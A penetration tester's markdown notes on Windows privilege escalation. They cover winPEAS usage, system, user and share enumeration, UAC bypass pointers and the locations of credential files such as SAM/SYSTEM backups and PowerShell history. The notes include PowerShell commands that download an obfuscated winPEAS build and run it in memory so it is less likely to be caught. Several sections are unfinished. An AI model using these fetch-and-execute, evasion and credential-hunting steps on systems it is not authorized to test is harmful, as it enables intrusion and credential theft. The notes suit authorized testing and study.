# Windows Privilege Escalation

...or basically just enumeration after exploitation. This page desribes how to gather information, what to look for and how to use it. I also include the parts of post-exploitation regarding credential harvesting in here.

For AD specific attacks like kerberos protocol and SPNs, see [windows-ad page.](windows-ad.md)

## winPEAS

winPEAS is will do everything you do manually but better, however, it runs on host and will probably get you caught if you just copy it over and go.

* [PEASSng project github](https://github.com/carlospolop/PEASS-ng)
* [winPEASexe](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe)
* [winPEASbat](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat)
* [Latest obfuscated version of winPEASexe]("https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe")

  ```
  https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
  ```

**The *ofs* versions in releases page are obfuscated versions, use these**

winPEASexe is what you'll want to use, winPEASbat is made for windows versions that do not support '.NET4' and is not as rich in functionality.

### Basic usage

Go to the winPEASexe page, it has a really good quickstart guide on how to run the file in a various of ways.

*General good-to-know switches*

```
# removes banner and logs to file
quiet log | log=outfile

# Remove colors
notcolor

# Run domain checks as well
domain

# Additional living-off-the-land checks
-lolbas
```

More switches corresponding to certain areas will be mentioned in other chapters.

#### On-disk, in memory and obfuscating

These are copied from the winPEASexe page.

```powershell
# Download and run in memory
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")

# Convert it from b64 encoding and run in memory
$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
[winPEAS.Program]::Main("log")

# The $thecontet variable here can be from clipboard or from a file.
# Make the variable from a file:
$thecontent = Get-Content -Path "C:\Path\totext.txt"
```

Copy a single-line b64 encoded string

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

base64 -w 0 winPEASany_ofs.exe | xclip -sel c
base64 -w 0 winPEASany_ofs.exe > djskL.txt
```

### powershell-empire

* powershell-empire has a winPEAS module.
* The script 'Invoke-winPEAS.ps1' is included as well.

## General system information

`winPEASexe systeminfo`

* systeminfo command gives you 90% of what you want to know most of the time.

```
systeminfo
```

* You can be more specific and get prettier lists with wmic command.

```
wmic qfe [get Caption,HotFixID]
wmic os get Caption,BuildNumber,osarchitecture
```

* Or list updates with powershell.

```powershell
get-hotfix
get-hotfix -description "security update"
get-hotfix | foreach {$_.hotfixid}
```

* The enviroment variables are a good source for information and sometimes even credentials.

```
set
echo %COMPUTERNAME% | %PROCESSOR_ARCHITECTURE% | %LOGONSERVER% | %USERNAME% | %USERDOMAIN%
``` 

## Users and groups

If you're not privileged, who is?

```
whoami [/all]
net user YOUR_USERNAME [/domain]
dir C:\Users
net localgroup "Administrators"
net group "Domain Admins" /domain
```

* Looking inside the Users folder gives you and idea of who has been logged in.
* Looking at the output, determine if your "just" a user or not. You might be local administrator trapped in a medium integrity shell or have special permissions somehow.

### Bypassing UAC

*UNDER CONSTRUCTION*

Look at the groups permissions of whoami, specifically if 'BUILTIN\Administrators' is there and at the 'Mandator Label\SOMETHING Mandatory Level'. If you're a local admin but with medium integrity you "only" need to elevate this to a high mandatory level. This is normally done by right clicking cmd.exe and choose "Run as administrator" and confirm this when the UAC Prompt apperas. However if you don't have a graphical interface, you need to prevent the UAC Prompt by bypassing the UAC somehow.

**Automated**

Search for bypassuac in msfconsole to, there's a bunch of them, set session and go.

**Manual**

* If you can find a way to RDP, do it. Then just right click and "Run as administrator" and confirm in UAC prompt.
* https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
* fodhelper

### SeImpersonatePrivilege and SeAssignPrimaryToken

*UNDER CONSTRUCTION*

## Drives, shares, folders and files

*UNDER CONSTRUCTION*

* Poke around manually in the most common places.

* Command history.

* What drives and shares are available, look in to anything that stands out.

```
# List shares
net share

# CMD wmic
wmic logicaldisk get Caption,Name,VolumeName,Description,Size

# Powershell
get-wmiobject -class win32_logicaldisk
```

* Search for files named something or containing something.

* Common interesting folders and files:

| Path | Why |
| - | - |
| C:\ or other system roots | Always worth checking.
| C:\Users\Administrator\ | Check out the users folders. |
| C:\User\[anyuser]\AppData | Lots of interesting stuff. |
| C:\Users\[anyuser]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine | Check for file 'ConsoleHost_history.txt', PS command history. |
| C:\Windows\system32\config\ | Location of the SAM/SYSTEM files. |
| C:\Windows\Repair\ | Possible SAM/SYSTEM backup. |
| C:\Windows\System32\config\RegBack | Possible SAM/SYSTEM backup. |
| C:\Windows\system32\cmd.exe | For usage in scripts etc. |
| C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe | Location of powershell, for usage in scripts etc. |
| C:\Windws\temp | Usually writeable globally. |
| C:\Windows\system32\drivers\etc\hosts | Hosts file. |
| C:\Windows\System32\spool\drivers\color | By default whitelisted dir(Applocker). |
| C:\boot.ini | BIOS boot options. |

# Sections to do

* Credential Manager
* Autologon
* mimikatz
* SAM
* Registry
* Services
* Installed applications
* Text files
* Local admin, now what
* certutil